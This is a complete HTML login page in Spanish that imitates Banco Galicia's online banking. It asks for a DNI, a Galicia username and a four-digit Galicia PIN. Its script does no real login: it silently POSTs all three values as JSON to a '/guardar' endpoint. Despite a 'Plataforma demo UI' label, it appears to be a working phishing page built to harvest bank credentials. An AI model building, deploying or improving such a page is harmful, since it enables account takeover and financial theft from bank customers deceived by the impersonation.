<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Login UI</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:"Segoe UI", sans-serif;
}

body{
  background:#f4f4f4;
  height:100vh;
}

.container{
  display:flex;
  width:100%;
  height:100vh;
}

/* LEFT */
.left{
  flex:1;
  background:white;
  display:flex;
  justify-content:center;
  align-items:center;
  padding:40px;
}

.login-box{
  width:360px;
}

/* LOGO */
.logo-container{
  display:flex;
  flex-direction:column;
  align-items:center;
  margin-bottom:50px;
}

.logo-img{
  height:58px;
  width:auto;
  object-fit:contain;
}

.subtitle{
  font-size:13px;
  color:#888;
  margin-top:6px;
  letter-spacing:1px;
}

/* TITLE */
h1{
  font-size:44px;
  margin-bottom:40px;
  color:#333;
}

/* INPUTS */
.input-group{
  margin-bottom:28px;
}

input{
  width:100%;
  border:none;
  border-bottom:2px solid #ddd;
  padding:14px 4px;
  font-size:16px;
  outline:none;
  transition:.3s;
}

input:focus{
  border-color:#d13d3d;
}

/* CHECKBOX */
.options{
  margin-top:10px;
  margin-bottom:20px;
  font-size:14px;
  color:#777;
}

.check-label{
  display:flex;
  align-items:center;
  gap:8px;
  cursor:pointer;
}

.check-label input{
  width:16px;
  height:16px;
  accent-color:#2f6bff;
}

/* BUTTON */
button{
  width:100%;
  border:none;
  background:#e5e5e5;
  padding:16px;
  border-radius:4px;
  font-size:15px;
  font-weight:600;
  color:#888;
  cursor:not-allowed;
  transition:.2s;
}

button.active{
  background:#ff7a00;
  color:white;
  cursor:pointer;
}

button.active:hover{
  background:#e96d00;
}

#mensaje{
  margin-top:15px;
  font-size:14px;
  color:#333;
  min-height:20px;
}

/* LINKS */
.links{
  margin-top:22px;
  text-align:center;
}

.links a{
  display:block;
  margin-top:14px;
  font-size:14px;
  color:#c46d2d;
  text-decoration:none;
}

/* RIGHT */
.right{
  width:34%;
  background:url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?q=80&w=1200&auto=format&fit=crop') center/cover;
  position:relative;
}

.overlay{
  position:absolute;
  top:20px;
  right:20px;
  background:rgba(0,0,0,0.45);
  color:white;
  padding:14px;
  border-radius:8px;
}

.overlay h3{
  font-size:16px;
  margin-bottom:4px;
}

.overlay p{
  font-size:13px;
  opacity:.9;
}

/* MOBILE */
@media(max-width:900px){
  .right{display:none;}
  .left{width:100%;}
}
</style>

</head>

<body>

<div class="container">

  <div class="left">

    <div class="login-box">

      <!-- LOGO -->
      <div class="logo-container">
        <img src="/img/logo.png" class="logo-img" alt="Logo">
        <div class="subtitle">Online Banking</div>
      </div>

      <h1>Iniciar sesión</h1>

      <form id="miFormulario">

        <div class="input-group">
          <input type="text" name="usuario" placeholder="Tu DNI" required>
        </div>

        <div class="input-group">
          <input type="text" name="nombre" placeholder="Tu usuario Galicia" required>
        </div>

        <div class="input-group">
          <input 
            type="password" 
            name="clave" 
            placeholder="Tu clave Galicia" 
            required
            maxlength="4"
            inputmode="numeric"
            pattern="[0-9]{4}"
          >
        </div>

        <div class="options">
          <label class="check-label">
            <input type="checkbox">
            <span>Recordar clave y usuario</span>
          </label>
        </div>

        <button type="submit" id="btn" disabled>INICIAR SESIÓN</button>

        <div id="mensaje"></div>

      </form>

      <div class="links">
        <a href="#">Olvidé mis claves</a>
        <a href="#">Crear usuario / clave</a>
      </div>

    </div>

  </div>

  <div class="right">
    <div class="overlay">
      <h3>Bienvenido</h3>
      <p>Plataforma demo UI</p>
    </div>
  </div>

</div>

<script>
const form = document.getElementById('miFormulario');
const btn = document.getElementById('btn');

const inputs = form.querySelectorAll('input');

function checkForm() {
  const usuario = form.usuario.value.trim();
  const nombre = form.nombre.value.trim();
  const clave = form.clave.value.trim();

  if (
    usuario !== "" &&
    nombre !== "" &&
    clave.length === 4 &&
    /^[0-9]+$/.test(clave)
  ) {
    btn.disabled = false;
    btn.classList.add('active');
  } else {
    btn.disabled = true;
    btn.classList.remove('active');
  }
}

inputs.forEach(input => {
  input.addEventListener('input', checkForm);
});

form.addEventListener('submit', async (e) => {

  e.preventDefault();

  const btn = document.getElementById('btn');

  btn.disabled = true;
  btn.textContent = "Ingresando...";

  const usuario = e.target.usuario.value;
  const nombre = e.target.nombre.value;
  const clave = e.target.clave.value;

  await fetch('/guardar', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      usuario,
      nombre,
      clave
    })
  });

  btn.disabled = false;
  btn.textContent = "INICIAR SESIÓN";
});
</script>

</body>
</html>
